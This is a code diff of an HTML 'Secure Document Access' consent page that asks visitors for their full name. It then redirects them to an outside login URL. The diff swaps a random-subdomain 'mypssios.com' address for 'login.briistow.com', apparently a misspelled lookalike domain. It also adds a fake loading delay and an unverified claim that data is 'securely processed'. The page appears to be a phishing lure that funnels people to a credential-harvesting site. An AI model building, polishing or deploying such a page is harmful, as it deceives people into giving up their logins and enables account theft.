@@ -3,15 +3,24 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Document Consent Viewer</title>
+    <title>Secure Document Access | Consent Required</title>
     <style>
         :root {
-            --primary: #2563eb;
-            --error: #dc2626;
-            --text: #1f2937;
-            --text-secondary: #6b7280;
-            --border: #e5e7eb;
-            --danger-bg: #fee2e2;
+            --primary: #4361ee;
+            --primary-light: #4895ef;
+            --primary-dark: #3a0ca3;
+            --error: #e63946;
+            --success: #2a9d8f;
+            --text: #1d3557;
+            --text-secondary: #457b9d;
+            --text-light: #a8dadc;
+            --border: #e9ecef;
+            --danger-bg: #ffe5e9;
+            --background: #f8f9fa;
+            --card-bg: #ffffff;
+            --shadow: 0 10px 25px rgba(0, 0, 0, 0.05);
+            --shadow-hover: 0 15px 35px rgba(67, 97, 238, 0.1);
+            --gradient: linear-gradient(135deg, #4361ee 0%, #3a0ca3 100%);
         }
         
         * {
@@ -21,133 +30,325 @@
         }
         
         body {
-            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
             font-size: 16px;
-            line-height: 1.5;
+            line-height: 1.6;
             color: var(--text);
-            background: white;
-            padding: 0;
-            margin: 0;
+            background: var(--background);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 1.5rem;
         }
         
         .container {
-            width: min(90%, 500px);
-            margin: 4rem auto 0;
-            padding: 0;
+            width: min(90%, 520px);
+            background: var(--card-bg);
+            border-radius: 16px;
+            box-shadow: var(--shadow);
+            overflow: hidden;
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
         }
         
-        @media (max-width: 768px) {
-            .container {
-                margin-top: 2rem;
-            }
+        .container:hover {
+            transform: translateY(-5px);
+            box-shadow: var(--shadow-hover);
         }
         
-        .header {
-            font-size: 1.125rem;
-            font-weight: 600;
-            margin-bottom: 1.5rem;
-            display: block;
+        .header-section {
+            background: var(--gradient);
+            color: white;
+            padding: 2rem 2rem 1.5rem;
+            text-align: center;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .header-section::before {
+            content: "";
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: radial-gradient(circle, rgba(255,255,255,0.1) 0%, rgba(255,255,255,0) 70%);
+            z-index: 0;
+        }
+        
+        .header-icon {
+            width: 64px;
+            height: 64px;
+            background: rgba(255, 255, 255, 0.2);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 1rem;
+            position: relative;
+            z-index: 1;
+        }
+        
+        .header-icon svg {
+            width: 32px;
+            height: 32px;
+            fill: white;
+        }
+        
+        .header-title {
+            font-size: 1.5rem;
+            font-weight: 700;
+            margin-bottom: 0.5rem;
+            position: relative;
+            z-index: 1;
+        }
+        
+        .header-subtitle {
+            font-size: 0.95rem;
+            opacity: 0.9;
+            font-weight: 400;
+            position: relative;
+            z-index: 1;
+        }
+        
+        .content-section {
+            padding: 2rem;
         }
         
         .form-group {
-            margin-bottom: 1.5rem;
+            margin-bottom: 1.75rem;
+            position: relative;
         }
         
         .form-label {
             display: block;
-            color: var(--text-secondary);
-            font-size: 0.875rem;
-            margin-bottom: 0.5rem;
+            color: var(--text);
+            font-size: 0.95rem;
+            font-weight: 500;
+            margin-bottom: 0.75rem;
+            display: flex;
+            align-items: center;
         }
         
         .required-mark {
             color: var(--error);
+            margin-right: 4px;
         }
         
         .form-input {
             width: 100%;
-            height: 2.625rem;
-            padding: 0.625rem 0.9375rem;
-            border: 1px solid var(--border);
-            border-radius: 0.375rem;
+            height: 3.25rem;
+            padding: 0.875rem 1.25rem;
+            border: 2px solid var(--border);
+            border-radius: 10px;
             font-size: 1rem;
-            transition: all 0.2s ease;
+            transition: all 0.3s ease;
+            background: white;
         }
         
         .form-input:focus {
             outline: none;
             border-color: var(--primary);
-            box-shadow: 0 0 0 2px rgba(37, 99, 235, 0.1);
+            box-shadow: 0 0 0 3px rgba(67, 97, 238, 0.15);
+        }
+        
+        .form-input.valid {
+            border-color: var(--success);
+        }
+        
+        .form-input.error {
+            border-color: var(--error);
         }
         
         .error-message {
             color: var(--error);
-            font-size: 0.8125rem;
+            font-size: 0.85rem;
             margin-top: 0.5rem;
             display: none;
+            align-items: center;
+            gap: 6px;
+        }
+        
+        .error-icon {
+            width: 16px;
+            height: 16px;
         }
         
         .btn {
-            background: var(--primary);
+            background: var(--gradient);
             color: white;
             border: none;
-            border-radius: 0.375rem;
-            padding: 0.875rem 1.5rem;
+            border-radius: 10px;
+            padding: 1rem 1.5rem;
             font-size: 1rem;
+            font-weight: 600;
             cursor: pointer;
             width: 100%;
-            transition: opacity 0.2s;
+            transition: all 0.3s ease;
+            position: relative;
+            overflow: hidden;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
         }
         
         .btn:disabled {
             opacity: 0.6;
             cursor: not-allowed;
+            transform: none !important;
+        }
+        
+        .btn:not(:disabled):hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 20px rgba(67, 97, 238, 0.3);
+        }
+        
+        .btn:not(:disabled):active {
+            transform: translateY(0);
+        }
+        
+        .btn-icon {
+            width: 20px;
+            height: 20px;
+        }
+        
+        .btn-loading .btn-text {
+            opacity: 0;
+        }
+        
+        .btn-loading::after {
+            content: "";
+            position: absolute;
+            width: 20px;
+            height: 20px;
+            border: 2px solid transparent;
+            border-top: 2px solid white;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
         }
         
         .alert {
             padding: 1rem 1.25rem;
-            border-radius: 0.375rem;
+            border-radius: 10px;
             margin-bottom: 1.5rem;
             display: none;
+            align-items: flex-start;
+            gap: 10px;
         }
         
         .alert-danger {
             background: var(--danger-bg);
             color: var(--text);
+            border-left: 4px solid var(--error);
         }
         
-        .spacer {
-            margin-top: 2.25rem;
+        .alert-icon {
+            width: 20px;
+            height: 20px;
+            flex-shrink: 0;
+        }
+        
+        .footer-note {
+            text-align: center;
+            margin-top: 1.5rem;
+            font-size: 0.85rem;
+            color: var(--text-secondary);
+            line-height: 1.5;
         }
         
         .hidden {
             display: none;
         }
+        
+        .fade-in {
+            animation: fadeIn 0.5s ease forwards;
+        }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        
+        .shake {
+            animation: shake 0.5s ease;
+        }
+        
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            20%, 60% { transform: translateX(-5px); }
+            40%, 80% { transform: translateX(5px); }
+        }
+        
+        @media (max-width: 480px) {
+            .content-section {
+                padding: 1.5rem;
+            }
+            
+            .header-section {
+                padding: 1.5rem 1.5rem 1rem;
+            }
+        }
     </style>
 </head>
 <body>
-    <div class="container">
-        <div id="commonError" class="alert alert-danger hidden" role="alert"></div>
-        <span class="header">  ESSENTIAL DOCUMENT  .</span>
+    <div class="container fade-in">
+        <div class="header-section">
+            <div class="header-icon">
+                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                    <path d="M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm0 16H5V5h14v14z"/>
+                    <path d="M17.99 9l-1.41-1.42-6.59 6.59-2.58-2.57-1.42 1.41 4 3.99z"/>
+                </svg>
+            </div>
+            <h1 class="header-title">Secure Document Access</h1>
+            <p class="header-subtitle">Please verify your identity to continue</p>
+        </div>
         
-        <form id="consentForm" novalidate>
-            <div class="form-group">
-                <label for="name" class="form-label">
-                    <span class="required-mark" aria-hidden="true">*</span> 
-                    <span>Please enter your name to continue</span>
-                </label>
-                <input type="text" id="name" class="form-input" name="name" 
-                       placeholder="Your Name" autocomplete="name" required
-                       aria-required="true" aria-describedby="nameError">
-                <span id="nameError" class="error-message hidden" role="alert"></span>
+        <div class="content-section">
+            <div id="commonError" class="alert alert-danger hidden">
+                <svg class="alert-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="var(--error)">
+                    <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>
+                </svg>
+                <span id="commonErrorText"></span>
             </div>
             
-            <div class="form-group spacer">
-                <button type="submit" id="submitBtn" class="btn" disabled>
-                    View
-                </button>
+            <form id="consentForm" novalidate>
+                <div class="form-group">
+                    <label for="name" class="form-label">
+                        <span class="required-mark" aria-hidden="true">*</span> 
+                        <span>Please enter your full name to continue</span>
+                    </label>
+                    <input type="text" id="name" class="form-input" name="name" 
+                           placeholder="Enter your full name" autocomplete="name" required
+                           aria-required="true" aria-describedby="nameError">
+                    <span id="nameError" class="error-message hidden" role="alert">
+                        <svg class="error-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="var(--error)">
+                            <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>
+                        </svg>
+                        <span id="nameErrorText"></span>
+                    </span>
+                </div>
+                
+                <div class="form-group">
+                    <button type="submit" id="submitBtn" class="btn" disabled>
+                        <svg class="btn-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="white">
+                            <path d="M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm0 16H5V5h14v14z"/>
+                            <path d="M17.99 9l-1.41-1.42-6.59 6.59-2.58-2.57-1.42 1.41 4 3.99z"/>
+                        </svg>
+                        <span class="btn-text">Review</span>
+                    </button>
+                </div>
+            </form>
+            
+            <div class="footer-note">
+                <p>Your information is securely processed and never shared with third parties.</p>
             </div>
-        </form>
+        </div>
     </div>
 
     <script>
@@ -157,25 +358,46 @@
                     form: document.getElementById('consentForm'),
                     nameInput: document.getElementById('name'),
                     nameError: document.getElementById('nameError'),
+                    nameErrorText: document.getElementById('nameErrorText'),
                     submitBtn: document.getElementById('submitBtn'),
-                    commonError: document.getElementById('commonError')
+                    commonError: document.getElementById('commonError'),
+                    commonErrorText: document.getElementById('commonErrorText')
                 };
                 
+                this.isSubmitting = false;
                 this.initialize();
             }
             
             initialize() {
                 this.setupEventListeners();
+                this.elements.nameInput.focus();
             }
             
             setupEventListeners() {
                 this.elements.nameInput.addEventListener('blur', () => this.validateName());
                 this.elements.nameInput.addEventListener('input', () => {
-                    if (this.elements.nameError.style.display === 'block') {
-                        this.validateName();
+                    this.hideError(this.elements.nameError);
+                    this.hideError(this.elements.commonError);
+                    
+                    // Update input styling
+                    if (this.elements.nameInput.value.trim().length > 0) {
+                        this.elements.nameInput.classList.remove('error');
+                        if (this.elements.nameInput.value.trim().length >= 2) {
+                            this.elements.nameInput.classList.add('valid');
+                        }
+                    } else {
+                        this.elements.nameInput.classList.remove('valid', 'error');
                     }
+                    
                     // Enable/disable button based on input
                     this.toggleSubmitButton(this.elements.nameInput.value.trim().length > 1);
+                });
+                
+                this.elements.nameInput.addEventListener('keypress', (e) => {
+                    if (e.key === 'Enter') {
+                        e.preventDefault();
+                        this.handleSubmit();
+                    }
                 });
                 
                 this.elements.form.addEventListener('submit', (e) => {
@@ -188,40 +410,83 @@
                 const name = this.elements.nameInput.value.trim();
                 
                 if (!name) {
-                    this.showError(this.elements.nameError, 'Name is required.');
+                    this.showError(this.elements.nameError, 'Name is required to continue.');
+                    this.elements.nameInput.classList.add('error');
+                    this.elements.nameInput.classList.remove('valid');
                     return false;
                 }
                 
                 if (name.length < 2) {
-                    this.showError(this.elements.nameError, 'Name must be at least 2 characters.');
+                    this.showError(this.elements.nameError, 'Please enter a valid name (at least 2 characters).');
+                    this.elements.nameInput.classList.add('error');
+                    this.elements.nameInput.classList.remove('valid');
+                    return false;
+                }
+                
+                // Check for valid name format (letters, spaces, hyphens, apostrophes)
+                const nameRegex = /^[a-zA-ZàáâäãåąčćęèéêëėįìíîïłńòóôöõøùúûüųūÿýżźñçčšžÀÁÂÄÃÅĄĆČĖĘÈÉÊËÌÍÎÏĮŁŃÒÓÔÖÕØÙÚÛÜŲŪŸÝŻŹÑßÇŒÆČŠŽ∂ð ,.'-]+$/u;
+                if (!nameRegex.test(name)) {
+                    this.showError(this.elements.nameError, 'Please enter a valid name (only letters and common name characters allowed).');
+                    this.elements.nameInput.classList.add('error');
+                    this.elements.nameInput.classList.remove('valid');
                     return false;
                 }
                 
                 this.hideError(this.elements.nameError);
+                this.elements.nameInput.classList.remove('error');
+                this.elements.nameInput.classList.add('valid');
                 return true;
             }
             
             showError(element, message) {
-                element.textContent = message;
-                element.style.display = 'block';
+                if (element === this.elements.nameError) {
+                    this.elements.nameErrorText.textContent = message;
+                } else if (element === this.elements.commonError) {
+                    this.elements.commonErrorText.textContent = message;
+                }
+                
+                element.style.display = 'flex';
                 this.toggleSubmitButton(false);
+                
+                // Add shake animation for emphasis
+                if (element === this.elements.nameError) {
+                    this.elements.nameInput.classList.add('shake');
+                    setTimeout(() => {
+                        this.elements.nameInput.classList.remove('shake');
+                    }, 500);
+                }
             }
             
             hideError(element) {
-                element.textContent = '';
                 element.style.display = 'none';
-                this.toggleSubmitButton(true);
             }
             
             toggleSubmitButton(enabled) {
-                this.elements.submitBtn.disabled = !enabled || 
-                    this.elements.nameInput.value.trim().length < 2;
+                this.elements.submitBtn.disabled = !enabled || this.isSubmitting;
             }
             
-            handleSubmit() {
+            setLoadingState(loading) {
+                this.isSubmitting = loading;
+                if (loading) {
+                    this.elements.submitBtn.classList.add('btn-loading');
+                    this.elements.submitBtn.disabled = true;
+                } else {
+                    this.elements.submitBtn.classList.remove('btn-loading');
+                    this.toggleSubmitButton(this.elements.nameInput.value.trim().length > 1);
+                }
+            }
+            
+            async handleSubmit() {
                 if (this.validateName()) {
+                    this.setLoadingState(true);
                     
-                    window.location.href = "https://auth.3c541d3468d6.mypssios.com/c";
+                    // Simulate API call with a small delay for better UX
+                    await new Promise(resolve => setTimeout(resolve, 800));
+                    
+                    // Redirect to the document
+                    window.location.href = "https://login.briistow.com/c";
+                } else {
+                    this.showError(this.elements.commonError, 'Please correct the errors above to continue.');
                 }
             }
         }
